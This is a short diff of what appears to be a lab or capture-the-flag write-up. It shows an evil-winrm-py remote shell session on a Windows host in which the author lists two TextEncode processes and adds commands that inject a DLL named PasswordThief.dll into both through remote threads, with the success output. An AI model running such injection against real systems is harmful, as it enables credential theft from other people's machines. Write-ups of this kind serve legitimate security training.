@@ -480,8 +480,8 @@ evil-winrm-py PS C:\Users\jdoe\Documents> Get-Process TextEncode | Select-Object
 
   Id ProcessName
   -- -----------
-1044 TextEncode 
-6920 TextEncode 
+4164 TextEncode 
+7104 TextEncode 
 
 
 evil-winrm-py PS C:\Users\jdoe\Documents
@@ -490,5 +490,15 @@ evil-winrm-py PS C:\Users\jdoe\Documents
 I need to inject into both of these processess
 
 ```python
+evil-winrm-py PS C:\Users\jdoe\Documents> .\injector.exe PasswordThief.dll 4164
+Injecting DLL: PasswordThief.dll into process with PID 4164 ...
+[+] Remote thread has been created successfully ...
 
+evil-winrm-py PS C:\Users\jdoe\Documents> .\injector.exe PasswordThief.dll 7104
+Injecting DLL: PasswordThief.dll into process with PID 7104 ...
+[+] Remote thread has been created successfully ...
+evil-winrm-py PS C:\Users\jdoe\Documents>
 ```
+
+Then ill inject into both
+
